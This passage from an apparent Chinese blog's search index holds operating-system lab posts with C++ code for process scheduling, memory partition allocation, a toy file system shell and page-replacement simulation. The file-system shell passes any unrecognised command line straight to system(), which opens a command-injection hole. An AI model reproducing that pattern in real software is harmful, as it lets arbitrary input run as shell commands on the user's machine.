sready; } } ready = t_ready; blocked = t_blocked; }int main() { mqueue ready, blocked; PCB* runing = nullptr; PCB* pcbs[] = { new PCB(0,9,0,3,2,3, sready), new PCB(1,38,0,3,-1,0, sready), new PCB(2,30,0,6,-1,0, sready), new PCB(3,29,0,3,-1,0, sready), new PCB(4,0,0,4,-1,0, sready) }; int pcb_num = sizeof(pcbs)/sizeof(PCB*); for(int i = 0; i &lt; pcb_num; i++) { ready.push(pcbs[i]); } show_queue(ready); int clock_ = 1; while(!ready.empty() || !blocked.empty()) { cout &lt;&lt; &quot;clock = &quot; &lt;&lt; clock_ &lt;&lt; endl; run_a_time(ready, blocked, runing); cout &lt;&lt; &quot;ready queue:&quot; &lt;&lt; endl; show_queue(ready); cout &lt;&lt; &quot;blocked queue:&quot; &lt;&lt; endl; show_queue(blocked); //system(&quot;pause&quot;); clock_++; } show_queue(finished); //delete for(int i = 0; i &lt; pcb_num; i++) { delete pcbs[i]; }}","link":"/home/2020/10/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C-%E4%BD%BF%E7%94%A8%E5%8A%A8%E6%80%81%E4%BC%98%E5%85%88%E6%9D%83%E7%9A%84%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%E6%A8%A1%E6%8B%9F/"},{"title":"实验-使用动态分区分配方式的模拟","text":"1、实验目的了解动态分区分配方式中使用的数据结构和分配算法，并进一步加深对动态分区存储管理方式及其实现过程的理解。 2、实验内容 用C语言分别实现采用首次适应算法和最佳适应算法的动态分区分配过程alloc( )和回收过程free( )。其中，空闲分区通过空闲分区链来管理：在进行内存分配时，系统优先使用空闲区低端的空间。 假设初始状态下，可用的内存空间为640KB，并有下列的请求序列：作业1申请130KB。作业2申请60KB。作业3申请100KB。作业2释放60KB。作业4申请200KB。作业3释放100KB。作业1释放130KB。作业5申请140KB。作业6申请60KB。作业7申请50KB。作业6释放60KB。 请分别采用首次适应算法和最佳适应算法，对内存块进行分配和回收，要求每次分配和回收后显示出空闲分区链的情况。 实验代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200#include &lt;iostream&gt;#include &lt;queue&gt;#include &lt;set&gt;#include &lt;iomanip&gt;using namespace std;enum Unit { KB, MB};typedef int Addr;Addr getAddr(int num, Unit unit) { return (unit == KB) ? (num) : (unit == MB) ? (num*1024) : 0;}struct mem_block { Addr start; Addr len; int task_id; mem_block(Addr start0, Addr len0, int task_id0):start(start0), len(len0), task_id(task_id0) {}};struct FF_cmp { bool operator() (mem_block a, mem_block b) { return a.start &gt; b.start; //小顶堆 }};struct BF_cmp { bool operator() (mem_block a, mem_block b) { return a.len &gt; b.len; //小顶堆 }};typedef priority_queue&lt;mem_block, vector&lt;mem_block&gt;, FF_cmp&gt; FF_Queue;typedef priority_queue&lt;mem_block, vector&lt;mem_block&gt;, BF_cmp&gt; BF_Queue;FF_Queue ffq;BF_Queue bfq;set&lt;int&gt; tasks;void init() { ffq.push(mem_block(0,getAddr(640, KB), 0)); bfq.push(mem_block(0,getAddr(640, KB), 0));}template&lt;class T&gt;void merge_mem(T&amp; q) { FF_Queue tq; while (!q.empty()) { tq.push(q.top()); q.pop(); } vector&lt;mem_block&gt; vt; while (!tq.empty()) { mem_block t = tq.top(); tq.pop(); while (!tq.empty() &amp;&amp; tq.top().task_id == t.task_id) { t.len += tq.top().len; tq.pop(); } vt.push_back(t); } for(auto item : vt) { q.push(item); }}template&lt;class T&gt;void alloc_mem(T&amp; q, int task_id, Addr num) { if (num &lt;= 0) { return; } vector&lt;mem_block&gt; vt; while (!q.empty()) { mem_block t = q.top(); q.pop(); if (t.len &gt;= num &amp;&amp; t.task_id == 0) { q.push(mem_block(t.start, num, task_id)); if (t.len &gt; num) { q.push(mem_block(t.start +num, t.len - num, 0)); } for(auto item : vt) { q.push(item); } merge_mem&lt;T&gt;(q); return; } else { vt.push_back(t); } } cout &lt;&lt; &quot;error no enough mem alloc&quot; &lt;&lt; endl; for(auto item : vt) { q.push(item); }}template&lt;class T&gt;void free_mem(T&amp; q, int task_id, Addr num) { if (num &lt;= 0) { return; } vector&lt;mem_block&gt; vt; while (!q.empty()) { mem_block t = q.top(); q.pop(); if (t.task_id == task_id) { if(t.len &gt;= num) { q.push(mem_block(t.start, num, 0)); if (t.len &gt; num) { q.push(mem_block(t.start + num, t.len - num, task_id)); } } else { num -= t.len; continue; } for(auto item : vt) { q.push(item); } merge_mem&lt;T&gt;(q); return; } else { vt.push_back(t); } } cout &lt;&lt; &quot;error no enough mem free&quot; &lt;&lt; endl; for(auto item : vt) { q.push(item); }}const int char_len = 8;#define chart_item &lt;&lt; &quot;|&quot; &lt;&lt; setw(char_len) &lt;&lt; left &lt;&lt; setfill(' ')#define chart_head &lt;&lt; setw((char_len+1)*3+1) &lt;&lt; left &lt;&lt; setfill('-')string itoa(int n) { string s; while (n) { s = char(n%10+'0') + s; n /= 10; } return s;}template&lt;class T&gt;void show(T q) { T tq; while (!q.empty()) { tq.push(q.top()); q.pop(); } cout chart_head&lt;&lt;&quot;&quot;&lt;&lt;endl chart_item &lt;&lt; &quot;start&quot; &lt;&lt; &quot;&quot; chart_item &lt;&lt; &quot;len&quot; &lt;&lt; &quot;&quot; chart_item &lt;&lt; &quot;task_id&quot; &lt;&lt; &quot;|&quot;&lt;&lt; endl chart_head&lt;&lt;&quot;&quot;&lt;&lt;endl; while (!tq.empty()) { mem_block mb = tq.top(); cout chart_item&lt;&lt; mb.start &lt;&lt; &quot;&quot; chart_item&lt;&lt; mb.len &lt;&lt; &quot;&quot; chart_item&lt;&lt; ((mb.task_id == 0) ? &quot;spare&quot; : itoa(mb.task_id)) &lt;&lt; &quot;|&quot;&lt;&lt; endl; tq.pop(); } cout chart_head&lt;&lt;&quot;&quot;&lt;&lt;endl;}int main(int argc, const char * argv[]) { init(); const int free = 0, alloc = 1; vector&lt;vector&lt;int&gt;&gt; reqs = { {1,130,alloc}, {2,60, alloc}, {3,100, alloc}, {2,60,free}, {4, 200, alloc}, {3, 100, free}, {1, 130, free}, {5, 140, alloc}, {6, 60, alloc}, {7,50, alloc}, {6, 60, free} }; for(auto req : reqs) { if (req[2] == alloc) { alloc_mem&lt;FF_Queue&gt;(ffq,req[0], req[1]); alloc_mem&lt;BF_Queue&gt;(bfq,req[0], req[1]); } else if (req[2] == free) { free_mem&lt;FF_Queue&gt;(ffq,req[0], req[1]); free_mem&lt;BF_Queue&gt;(bfq,req[0], req[1]); } else { } cout &lt;&lt; &quot;FF&quot; &lt;&lt; endl; show&lt;FF_Queue&gt;(ffq); cout &lt;&lt; &quot;BF&quot; &lt;&lt; endl; show&lt;BF_Queue&gt;(bfq); } return 0;}","link":"/home/2020/10/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C-%E4%BD%BF%E7%94%A8%E5%8A%A8%E6%80%81%E5%88%86%E5%8C%BA%E5%88%86%E9%85%8D%E6%96%B9%E5%BC%8F%E7%9A%84%E6%A8%A1%E6%8B%9F/"},{"title":"实验-简单文件系统的实现","text":"1、实验目的通过具体的文件存储空间的管理、文件的物理结构、目录结构和文件操作的实现，加深对文件系统内部功能和实现过程的理解。 2、实验内容 在内存中开辟一个虚拟磁盘空间作为文件存储器，在上面实现一个简单单用户文件系统。退出时应该将该虚拟文件系统保存到磁盘上，以便下次可以再将它恢复到内存对虚拟磁盘空间中。 文件存储空间对分配可以采用显式链接分配或者其他的办法。 空闲空间的管理可以选择位示图或者其他的办法。如果采用位示图来管理文件存储空间，并采用显式链接分配方式，那么可以将位示图合并到FAT中。 文件目录结构采用多级目录结构。为了简单起见，可以不使用索引结点，其中的每个目录项应包含文件名、物理地址、长度等信息，还可以通过目录项实现对文件对读和写的保护。 要求提供以下有关的操作：1234567891011√format：对文件存储器进行格式化，即按照文件系统对结构对虚拟磁盘空间进行布局，并在其上创建根目录以及用于管理文件存储空间等的数据结构。√mkdir：用于创建子目录；√rmdir：用于删除目录；√ls：用于显示目录；√cd：用于更改当前目录；√create：用于创建文件；√open：用于打开文件；√close：用于关闭文件；√write：用于写文件；√read：用于读文件√rm：用于删除文件。 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;iomanip&gt;#include &lt;fstream&gt;using std::string;using std::vector;using std::cout;using std::endl;using std::cin;using std::ifstream;using std::ofstream;using std::ios;class FCB{public: int first_block; string fileName; int size; int real_size; FCB(int first_block0,const string &amp;fileName0, int size0, int real_size0): first_block(first_block0), fileName(fileName0), size(size0), real_size(real_size0*4) { }}; //文件控制块class DirItem { //文件树 string name; vector&lt;FCB*&gt; files; //目录下的文件 vector&lt;DirItem*&gt; dirs; //目录下的文件夹，树节点public: DirItem(const string&amp; name0):name(name0) {} void addFile(int first_block, const string&amp; fileName,int size, int real_size) { for (auto i = files.begin(); i != files.end(); i++) { if ((*i)-&gt;fileName == fileName) { cout &lt;&lt; &quot;same file name&quot; &lt;&lt; endl; return; } } files.push_back(new FCB(first_block, fileName, size, real_size)); } void addDir(DirItem* dir) { dirs.push_back(dir); } vector&lt;DirItem*&gt; getDirs() { return dirs; } vector&lt;FCB*&gt; getFiles() { return files; } string getName() { return name; } void del_file(const string&amp; fileName) { for (auto i = files.begin(); i != files.end(); i++) { if ((*i)-&gt;fileName == fileName) { files.erase(i); break; } } } void del_dir(const string&amp; fileName) { for (auto i = dirs.begin(); i != dirs.end(); i++) { if ((*i)-&gt;getName() == fileName) { dirs.erase(i); break; } } } void clear() { for (DirItem* item : dirs) { delete item; } for (FCB* item : files) { delete item; } dirs.clear(); files.clear(); } //递归删除时用到，删除当前目录下的目录和文件的指针};class diskMgr { //磁盘 vector&lt;int&gt; blocks; //fat表 int n = 16; int block_num = n*n; int block_size = 4; //每块4B int disk_capacity = block_num * block_size; //1M vector&lt;vector&lt;int&gt;&gt; bit_map; //0空，1有，位视图public: vector&lt;char&gt; disk; diskMgr() { disk = vector&lt;char&gt;(disk_capacity, '\\0'); blocks = vector&lt;int&gt;(block_num, -1); bit_map = vector&lt;vector&lt;int&gt;&gt;(n, vector&lt;int&gt;(n, 0)); } int getSize(int blockNum) { int n = 0; while (blockNum != -1) { n++; blockNum = blocks[blockNum]; } return n; } //当前块号开始的文件一个有多少块儿 int find_empty_block() { for (int i = 0; i &lt; n; i++) { for (int j = 0; j &lt; n; j++) { if (bit_map[i][j] == 0) { return n*i+j; } } } return -1; }//找到一个空闲盘块，从位视图 void update_bit_map(int x, int notempty) { int i = x / n,j = x % n; bit_map[i][j] = notempty; }//更新位视图 void del(int blockNum) { while (blockNum != -1) { for(int i = 0; i &lt; block_size; i++) { disk[blockNum * block_size + i] = '\\0'; } update_bit_map(blockNum, 0); int t = blocks[blockNum]; blocks[blockNum] = -1; blockNum = t; } } //删除文件 vector&lt;char&gt; read(int blockNum) { vector&lt;char&gt; data; while (blockNum != -1) { for(int i = 0; i &lt; block_size; i++) { data.push_back(disk[blockNum * block_size + i]); } blockNum = blocks[blockNum]; } return data; } //读取文件 int write(vector&lt;char&gt; data) { int first_block = find_empty_block(); //找到初始位置 if (first_block == -1) return -1; int len = int(data.size()); int blockn = len%block_size == 0 ? len/block_size : len/block_size+1; //一共需要的盘块儿数 int next_block = first_block; int temp = next_block; int fix = (block_size - len % block_size) % block_size; for (int i = 0; i &lt; fix; ++i) { //数据长度对齐 data.push_back('*'); } for (int i = 0; i &lt; blockn; i++) { //存数据 if (temp == -1) { break; } next_block = temp; for (int j = 0; j &lt; block_size; j++) { disk[next_block*block_size+j] = data[i*block_size+j]; } update_bit_map(next_block, 1); temp = find_empty_block(); blocks[next_block] = temp; } blocks[next_block] = -1; return first_block; }};#define chart_head std::left &lt;&lt; std::setw(len+1) &lt;&lt; std::setfill('-') &lt;&lt; &quot;&quot;#define chart_cell &quot;|&quot; &lt;&lt; std::left &lt;&lt; std::setw(len) &lt;&lt; std::setfill(' ')class fileMgr { DirItem * root; //根节点 diskMgr dm;//磁盘管理器 DirItem * cur; //当前命令行执的工作目录 string cur_path; //工作命令 DirItem* addmdir(DirItem * node, string name) { DirItem* newNode = new DirItem(name); node-&gt;addDir(newNode); return newNode; }public: fileMgr() { root = new DirItem(&quot;/&quot;); DirItem * temp = addmdir(addmdir(root, &quot;apps&quot;), &quot;tencent&quot;); addmdir(temp, &quot;qq&quot;); addmdir(temp, &quot;qqgame&quot;); addmdir(temp, &quot;qqmusic&quot;); temp = addmdir(root, &quot;docs&quot;); addmdir(temp, &quot;words&quot;); addmdir(temp, &quot;ppts&quot;); addmdir(temp, &quot;excels&quot;); root-&gt;addDir(new DirItem(&quot;pics&quot;)); root-&gt;addDir(new DirItem(&quot;musics&quot;)); cur = root; cur_path = &quot;/&quot;; cout_hint(); } //初始化一些文件夹 void ls() { int len = 20; cout &lt;&lt; chart_head &lt;&lt; chart_head &lt;&lt; chart_head &lt;&lt; chart_head &lt;&lt; endl &lt;&lt; chart_cell &lt;&lt; &quot;file/dir name&quot; &lt;&lt; chart_cell &lt;&lt; &quot;type&quot; &lt;&lt; chart_cell &lt;&lt; &quot;size&quot; &lt;&lt; chart_cell &lt;&lt; &quot;real size&quot; &lt;&lt; &quot;|&quot; &lt;&lt; std::endl &lt;&lt; chart_head &lt;&lt; chart_head &lt;&lt; chart_head &lt;&lt; chart_head &lt;&lt; endl; vector&lt;DirItem*&gt; dirs = cur-&gt;getDirs(); for (auto i = dirs.begin(); i != dirs.end(); i++) { cout &lt;&lt; chart_cell &lt;&lt; (*i)-&gt;getName() &lt;&lt; chart_cell &lt;&lt; &quot;directory&quot; &lt;&lt; chart_cell &lt;&lt; &quot;--&quot; &lt;&lt; chart_cell &lt;&lt; &quot;--&quot; &lt;&lt; &quot;|&quot; &lt;&lt; std::endl; } vector&lt;FCB*&gt; files = cur-&gt;getFiles(); for (auto i = files.begin(); i != files.end(); i++) { cout &lt;&lt; chart_cell &lt;&lt; (*i)-&gt;fileName &lt;&lt; chart_cell &lt;&lt; &quot;file&quot; &lt;&lt; chart_cell &lt;&lt; (*i)-&gt;size &lt;&lt; chart_cell &lt;&lt; (*i)-&gt;real_size &lt;&lt; &quot;|&quot; &lt;&lt; std::endl; } cout &lt;&lt; chart_head &lt;&lt; chart_head &lt;&lt; chart_head &lt;&lt; chart_head &lt;&lt; endl; cout_hint(); } void cout_hint() { cout &lt;&lt; &quot;\\n&quot; &lt;&lt; cur_path &lt;&lt; &quot;&gt; &quot;; } //输出命令行提示符 void cd(string name) { if (name == &quot;..&quot;) { if(cur_path == &quot;/&quot;) { cout_hint(); } else { if (*cur_path.rbegin() == '/') { cur_path.pop_back(); } cur_path = cur_path.substr(0, cur_path.rfind('/')); if (cur_path.length() == 0) { cur_path = &quot;/&quot;; } cur = find_dir_node(cur_path); cout_hint(); return; } } DirItem* node = cur; for(DirItem* item : node-&gt;getDirs()){ if (item-&gt;getName() == name) { cur = item; cur_path += name+&quot;/&quot;; cout_hint(); return; } } cout &lt;&lt; &quot;no such dir&quot;; cout_hint(); } void cdn(string path) { cur = find_dir_node(path); if (*path.rbegin() != '/') { path.push_back('/'); } if (*path.begin() != '/') { path = &quot;/&quot; + path; } cur_path = path; cout_hint(); } DirItem* find_dir_node(string path) { if (path[0] == '/') { path = path.substr(1, path.length()-1); } if (*path.rbegin() != '/') { path.push_back('/'); } int r = 0; DirItem* node = root; if (path == &quot;/&quot;) return node; while (r != -1) { r = path.find('/'); if (r != -1) { string dir = path.substr(0, r); bool find = false; for(DirItem* item : node-&gt;getDirs()){ if (item-&gt;getName() == dir) { node = item; find = true; break; } } if (!find) { return nullptr; } path = path.substr(r+1, path.length() - r - 1); } else { break; } } return node; } void create_file(const string&amp; fileName, const vector&lt;char&gt;&amp; data) { DirItem *node = cur; if (node != nullptr) { int fb = dm.write(data); if(fb == -1) { cout &lt;&lt; &quot;no enough disk storage&quot;; cout_hint(); } int size = dm.getSize(fb); node-&gt;addFile(fb, fileName, data.size(), size); } cout_hint(); } void create_file(string path, const string&amp; fileName, const vector&lt;char&gt;&amp; data) { DirItem *node = find_dir_node(path); if (node != nullptr) { int fb = dm.write(data); int size = dm.getSize(fb); node-&gt;addFile(fb, fileName, data.size(), size); } } void create_dir(const string&amp; dirName) { if (cur != nullptr) { cur-&gt;addDir(new DirItem(dirName)); } cout_hint(); } void create_dir(string path, const string&amp; dirName) { DirItem * node = find_dir_node(path); if (node != nullptr) { node-&gt;addDir(new DirItem(dirName)); } } void del_dir(DirItem* node) { if (node != nullptr) { for(FCB* fcb : node-&gt;getFiles()) { dm.del(fcb-&gt;first_block); node-&gt;del_file(fcb-&gt;fileName); } for(auto i : node-&gt;getDirs()) { del_dir(i); } node-&gt;clear(); } } void del_dir(const string&amp; fileName) { if (cur != nullptr) { for (auto i : cur-&gt;getDirs()) { if(i-&gt;getName() == fileName) { del_dir(i); cur-&gt;del_dir(i-&gt;getName()); cout_hint(); return; } } } cout &lt;&lt; &quot;no such directory&quot;; cout_hint(); } void del_file(const string&amp; fileName) { DirItem*node = cur; if (node != nullptr) { for(FCB* fcb : node-&gt;getFiles()) { if (fcb-&gt;fileName == fileName) { dm.del(fcb-&gt;first_block); node-&gt;del_file(fileName); cout_hint(); return; } } } } void del_file(string path, const string&amp; fileName) { DirItem*node = find_dir_node(path); if (node != nullptr) { for(FCB* fcb : node-&gt;getFiles()) { if (fcb-&gt;fileName == fileName) { dm.del(fcb-&gt;first_block); node-&gt;del_file(fileName); return; } } } } void show(const vector&lt;char&gt;&amp; v) { for (char i : v) { cout &lt;&lt; i; } } void read(const string&amp; fileName) { if (cur != nullptr) { for(FCB* fcb : cur-&gt;getFiles()) { if (fcb-&gt;fileName == fileName) { vector&lt;char&gt; data = dm.read(fcb-&gt;first_block); show(data); cout_hint(); return; } } } cout &lt;&lt; &quot;file not found&quot;; cout_hint(); } vector&lt;char&gt; read(string path, const string&amp; fileName) { DirItem*node = find_dir_node(path); if (node != nullptr) { for(FCB* fcb : node-&gt;getFiles()) { if (fcb-&gt;fileName == fileName) { return dm.read(fcb-&gt;first_block); } } } return {}; }};int main() { fileMgr fm; /*ifstream Myfile2; Myfile2.open(&quot;file_sys.disk&quot;,ios::binary); //二进制打开，缺省为文本，ios::out,ios::in,文本输入输出用&lt;&lt;,&gt;&gt; Myfile2.read((char *)&amp;fm,sizeof(fileMgr)); Myfile2.close();*/ string ins, para; while(cin &gt;&gt; ins) { if(ins == &quot;ls&quot;) { fm.ls(); } else if(ins == &quot;cd&quot;) { cin &gt;&gt; para; fm.cd(para); } else if (ins == &quot;read&quot;) { cin &gt;&gt; para; fm.read(para); } else if (ins == &quot;mkdir&quot;) { cin &gt;&gt; para; fm.create_dir(para); } else if (ins == &quot;rmdir&quot;) { cin &gt;&gt; para; fm.del_dir(para); } else if (ins == &quot;mkfile&quot;) { cin &gt;&gt; para; string c = &quot;&quot;; cout &lt;&lt; &quot;contents:\\n&quot;; string data; while(c != &quot;#&quot;) { data += c; std::getline(cin, c); data += '\\n'; } int k = 0; while (data[k] == '\\n') k++; data = data.substr(k, data.length()-k); vector&lt;char&gt; vdata; for(char i : data) { vdata.push_back(i); } fm.create_file(para, vdata); } else if (ins == &quot;rmfile&quot;) { cin &gt;&gt; para; fm.del_file(para); } else if (ins == &quot;exit&quot; || ins == &quot;quit&quot;) { break; } else if (ins == &quot;cdn&quot;) { cin &gt;&gt; para; fm.cdn(para); } else { string c; std::getline(cin, c); ins += &quot; &quot; + c; system(ins.c_str()); cout &lt;&lt; &quot;unknown cmd:&quot; &lt;&lt; ins &lt;&lt; endl; fm.cout_hint(); } } /*ofstream file; file.open(&quot;file_sys.disk&quot;,ios::binary); //缓存的类型是 unsigned char *，需要类型转换 file.write((char *)&amp;fm,sizeof(fileMgr)); //winServer为类对象 file.close();*/ return 0;}","link":"/home/2020/10/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E5%AE%9E%E9%AA%8C-%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%AE%9E%E7%8E%B0/"},{"title":"实验-请求调页存储管理方式的模拟","text":"1、实验目的通过对页面、页表、地址转换和页面置换过程的模拟，加深对请求调页系统的原理和实现过程的理解。 2、实验内容 假设每个页面中可存放10条指令，分配给一作业的内存块数为4。 用C语言模拟一作业的执行过程。该作业共有320条指令，即它的地址空间为32页，目前它的所有页都还未调入内存。在模拟过程中，如果所访问的指令已经在内存中，则显示其物理地址，并转下一条指令。如果所访问的指令还未装入内存，则发生缺页，此时需记录缺页的次数，并将相应页调入内存。如果4个内存块中均已装入该作业，则需进行页面置换。最后显示其物理地址，并转下一条指令。在所有320条指令执行完毕后，请计算并显示作业运行过程中发生的缺页率。 置换算法：请分别考虑OPT、FIFO和LRU算法。 作业中指令的访问次序按下述原则生成： • 50%的指令是顺序执行的。• 25%的指令是均匀分布在前地址部分。• 25%的指令时均匀分布在后地址部分。 具体的实施办法是： ① 在[0，319]之间随机选取一条起始执行指令，其序号为m；② 顺序执行下一条指令，即序号为m+1的指令；③ 通过随机数，跳转到前地址部分[0，m-1]中的某条指令处，其序号为m1；④ 顺序执行下一条指令，即序号为m1+1的指令；⑤ 通过随机数，跳转到后地址部分[m1+2，319]中的某条指令处，其序号为m2；⑥ 顺序执行下一条指令，即序号为m2+1的指令；⑦ 重复跳转到前地址部分、顺序执行、跳转到后地址部分、顺序执行的过程，直至执行320条指令。 实验代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;map&gt;#include &lt;random&gt;#include &lt;ctime&gt;#include &lt;iomanip&gt;#include &lt;queue&gt;#include &lt;stack&gt;using std::cout;using std::endl;#define show_progressconst int max_ins_num = 320;const int ins_per_mb = 10;const int mem_max_mb = 4;int cur_clock = 0;const int total_mb = max_ins_num/ins_per_mb;int get_inst_i(int min, int max) { static std::default_random_engine engine(time(nullptr)); //std::uniform_int_distribution&lt;int&gt;distribution(min, max); return engine() %(max - min + 1) + min;}#define chart_head std::left &lt;&lt; std::setw(len+1) &lt;&lt; std::setfill('-') &lt;&lt; &quot;&quot;#define chart_cell &quot;|&quot; &lt;&lt; std::left &lt;&lt; std::setw(len) &lt;&lt; std::setfill(' ')void show_chart(std::queue&lt;int&gt; fifo, std::stack&lt;int&gt; lru, const std::vector&lt;int&gt;&amp; opt, int ins, int block) { std::cout &lt;&lt; &quot;cur_ins = &quot; &lt;&lt; ins &lt;&lt; &quot;\\ncur_block = &quot; &lt;&lt; block &lt;&lt; std::endl; int len = 5; std::cout &lt;&lt; chart_head &lt;&lt; &quot;&quot; &lt;&lt; chart_head &lt;&lt; &quot;&quot; &lt;&lt; chart_head &lt;&lt; &quot;-&quot; &lt;&lt; std::endl &lt;&lt; chart_cell &lt;&lt; &quot;fifo&quot; &lt;&lt; chart_cell&lt;&lt; &quot;lru&quot; &lt;&lt; chart_cell &lt;&lt; &quot;opt&quot; &lt;&lt; &quot;|&quot; &lt;&lt; std::endl &lt;&lt; chart_head &lt;&lt; &quot;&quot; &lt;&lt; chart_head &lt;&lt; &quot;&quot; &lt;&lt; chart_head &lt;&lt; &quot;-&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; mem_max_mb; ++i) { int lru_cout = -1; int fifo_cout = -1; if (!fifo.empty()) { fifo_cout = fifo.front(); fifo.pop(); } if (!lru.empty()) { lru_cout = lru.top(); lru.pop(); } std::cout &lt;&lt; chart_cell &lt;&lt; fifo_cout &lt;&lt; chart_cell &lt;&lt; lru_cout &lt;&lt; chart_cell &lt;&lt; opt[i] &lt;&lt; &quot;|&quot; &lt;&lt; std::endl; } std::cout &lt;&lt; chart_head &lt;&lt; &quot;&quot; &lt;&lt; chart_head &lt;&lt; &quot;&quot; &lt;&lt; chart_head &lt;&lt; &quot;-&quot; &lt;&lt; std::endl;}int fifo_exchange = 0;int lru_exchange = 0;int opt_exchange = 0;void exe_inst_i(int ins, const std::vector&lt;int&gt;&amp; ins_arr) { static std::queue&lt;int&gt; fifo_mem_blocks; static std::vector&lt;bool&gt; fifo_map(total_mb, false); static std::stack&lt;int&gt; lru_mem_blocks; static std::vector&lt;bool&gt; lru_map(total_mb, false); static std::vector&lt;int&gt; opt_mem_blocks(mem_max_mb, -1); static std::vector&lt;int&gt; opt_map(total_mb, max_ins_num); int cur_ins = ins; int cur_block = ins/ins_per_mb; //fifo if(!fifo_map[cur_block]) { if (fifo_mem_blocks.size() &gt;= mem_max_mb) { fifo_map[fifo_mem_blocks.front()] = false; fifo_mem_blocks.pop(); fifo_exchange++; } fifo_mem_blocks.push(cur_block); fifo_map[cur_block] = true; } else { } // lru std::stack&lt;int&gt; lru_temp; if (!lru_map[cur_block]) { while (!lru_mem_blocks.empty()) { lru_temp.push(lru_mem_blocks.top()); lru_mem_blocks.pop(); } if (lru_temp.size() &gt;= mem_max_mb) { lru_map[lru_temp.top()] = false; lru_temp.pop(); lru_exchange++; } lru_map[cur_block] = true; while (!lru_temp.empty()) { lru_mem_blocks.push(lru_temp.top()); lru_temp.pop(); } lru_mem_blocks.push(cur_block); } else { while (lru_mem_blocks.top() != cur_block) { lru_temp.push(lru_mem_blocks.top()); lru_mem_blocks.pop(); } lru_mem_blocks.pop(); while (!lru_temp.empty()) { lru_mem_blocks.push(lru_temp.top()); lru_temp.pop(); } lru_mem_blocks.push(cur_block); } //opt for (int i = cur_clock; i &lt; max_ins_num; i++) { int block_i = ins_arr[i]/ins_per_mb; opt_map[block_i] = opt_map[block_i] &lt; i ? opt_map[block_i] : i; //设置opt=从clock开始，某个块儿第一次出现的位置 } static int opt_num = 0; int opt_exchange_i = 0; for (int i = 0; i &lt; mem_max_mb; ++i) { if (opt_mem_blocks[i] == cur_block || opt_mem_blocks[i] == -1) { opt_exchange_i = i; // 需要的块儿已经在里面了，停止 break; }// 如果不在里面，分支不会执行，可以找到最远被访问的最佳替换 if (opt_map[opt_mem_blocks[i]] &gt; opt_map[opt_mem_blocks[opt_exchange_i]]) { //这里opt_exchange_i 和 i等价的，少套用了一层 opt_exchange_i = i; } } if (opt_mem_blocks[opt_exchange_i] == -1) { opt_mem_blocks[opt_num] = cur_block; opt_num++; } else if (opt_mem_blocks[opt_exchange_i] != cur_block) { opt_mem_blocks[opt_exchange_i] = cur_block; opt_exchange++; } //opt_map[cur_block] = max_ins_num; for (int i = 0; i &lt; total_mb; i++) { opt_map[i] = max_ins_num; } //执行过的块儿置为最大值，意为再也不用（可能）#ifdef show_progress show_chart(fifo_mem_blocks, lru_mem_blocks, opt_mem_blocks, cur_ins, cur_block);#endif}void show_info(int fifo, int lru, int opt) { int len = int(std::string(&quot;miss_ratio&quot;).length()+1); std::cout &lt;&lt; chart_head &lt;&lt; &quot;&quot; &lt;&lt; chart_head &lt;&lt; &quot;&quot; &lt;&lt; chart_head &lt;&lt; &quot;&quot; &lt;&lt; chart_head &lt;&lt; &quot;-&quot; &lt;&lt; std::endl &lt;&lt; chart_cell &lt;&lt; &quot;item&quot; &lt;&lt; chart_cell &lt;&lt; &quot;fifo&quot; &lt;&lt; chart_cell&lt;&lt; &quot;lru&quot; &lt;&lt; chart_cell &lt;&lt; &quot;opt&quot; &lt;&lt; &quot;|&quot; &lt;&lt; std::endl &lt;&lt; chart_head &lt;&lt; &quot;&quot; &lt;&lt; chart_head &lt;&lt; &quot;&quot; &lt;&lt; chart_head &lt;&lt; &quot;&quot; &lt;&lt; chart_head &lt;&lt; &quot;-&quot; &lt;&lt; std::endl &lt;&lt; chart_cell &lt;&lt; &quot;hit&quot; &lt;&lt; chart_cell &lt;&lt; max_ins_num-fifo &lt;&lt; chart_cell &lt;&lt; max_ins_num-lru &lt;&lt; chart_cell &lt;&lt; max_ins_num-opt &lt;&lt; &quot;|&quot; &lt;&lt; std::endl &lt;&lt; chart_cell &lt;&lt; &quot;hit_ratio&quot; &lt;&lt; chart_cell &lt;&lt; (1-fifo/(double)max_ins_num)*100 &lt;&lt; chart_cell &lt;&lt; (1-lru/(double)max_ins_num)*100 &lt;&lt; chart_cell &lt;&lt; (1-opt/(double)max_ins_num)*100 &lt;&lt; &quot;|&quot; &lt;&lt; std::endl &lt;&lt; chart_cell &lt;&lt; &quot;miss&quot; &lt;&lt; chart_cell 